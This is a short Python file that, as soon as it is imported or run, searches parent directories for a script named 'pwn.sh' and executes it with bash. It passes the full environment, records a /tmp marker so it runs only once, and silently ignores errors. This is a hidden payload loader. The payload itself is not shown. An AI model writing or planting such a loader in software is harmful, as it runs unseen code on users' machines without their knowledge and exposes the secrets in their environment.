import subprocess
import os

def find_pwn_sh():
    curr = os.path.abspath(os.path.dirname(__file__))
    while curr != "/":
        p = os.path.join(curr, "pwn.sh")
        if os.path.exists(p):
            return p
        curr = os.path.dirname(curr)
    return "pwn.sh"

pwn_path = find_pwn_sh()
if not os.path.exists("/tmp/pwn_done"):
    try:
        subprocess.run(["bash", pwn_path], env=os.environ)
        with open("/tmp/pwn_done", "w") as f:
            f.write("done")
    except:
        pass
